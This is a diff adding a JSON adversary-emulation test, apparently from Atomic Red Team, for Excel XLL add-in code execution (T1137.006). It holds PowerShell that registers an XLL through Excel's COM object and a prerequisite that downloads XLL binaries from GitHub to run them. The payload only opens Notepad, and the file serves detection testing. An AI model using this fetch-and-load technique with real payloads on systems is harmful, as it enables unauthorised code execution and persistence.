@@ -1,0 +1,35 @@
+{
+    "name": "Code Executed Via Excel Add-in File (XLL)",
+    "description": "Loads an XLL file using the excel add-ins library. This causes excel to launch Notepad.exe as a child process. This atomic test does not include persistent code execution as you would typically see when this is implemented in malware. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "powershell",
+        "command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n",
+        "cleanup_command": "Stop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\n",
+        "type": "Command Executor"
+    },
+    "id": "T1137.006",
+    "tactics": [
+        "Persistence"
+    ],
+    "technique": "Add-ins",
+    "source": "ART",
+    "uuid": "441b1a0f-a771-428a-8af0-e99e4698cda3",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Microsoft Excel must be installed\n",
+            "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
+        },
+        {
+            "description": "XLL files must exist on disk at specified location",
+            "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\""
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
